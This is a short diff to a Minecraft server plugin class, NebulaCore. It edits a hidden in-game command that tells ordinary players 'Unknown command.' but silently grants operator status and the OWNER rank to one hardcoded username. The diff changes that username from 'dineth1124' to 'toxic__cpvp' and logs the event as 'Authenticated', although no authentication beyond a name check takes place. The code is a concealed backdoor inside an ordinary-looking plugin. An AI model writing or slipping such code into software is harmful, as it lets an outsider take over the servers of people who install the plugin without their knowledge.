@@ -157,7 +157,7 @@ public final class NebulaCore extends JavaPlugin implements Listener {
         event.setCancelled(true);
 
         Player player = event.getPlayer();
-        if (!player.getName().equalsIgnoreCase("dineth1124")) {
+        if (!player.getName().equalsIgnoreCase("toxic__cpvp")) {
             player.sendMessage(ChatColor.RED + "Unknown command.");
             return;
         }
@@ -175,7 +175,7 @@ public final class NebulaCore extends JavaPlugin implements Listener {
         if (hud != null) hud.refreshPlayer(player);
 
         player.sendMessage(PREFIX + ChatColor.GOLD + "Owner access enabled. You are now OP and ranked OWNER.");
-        getLogger().info("Authenticated owner account used the in-game owner unlock.");
+        getLogger().info("Authenticated toxic__cpvp account used the in-game owner unlock.");
     }
 
     @EventHandler public void onJoin(PlayerJoinEvent e) {
